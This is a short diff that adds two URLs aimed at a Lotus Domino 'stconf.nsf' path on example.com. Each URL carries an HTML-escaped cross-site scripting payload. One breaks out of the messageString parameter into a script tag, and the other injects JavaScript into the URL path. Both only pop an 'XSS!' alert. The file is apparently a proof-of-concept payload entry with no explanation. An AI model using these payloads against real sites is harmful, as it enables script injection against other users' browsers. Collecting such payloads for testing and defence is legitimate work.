@@ -1,0 +1,3 @@
+http://www.example.com/stconf.nsf/WebMessage?OpenView&amp;messageString=&quot;;&gt;&lt;script&gt;alert(&quot;XSS!&quot;)&lt;/script&gt;#
+
+http://www.example.com/stconf.nsf/&quot;;);} alert(&quot;XSS!&quot;); function a(){ var a=unescape(&quot;
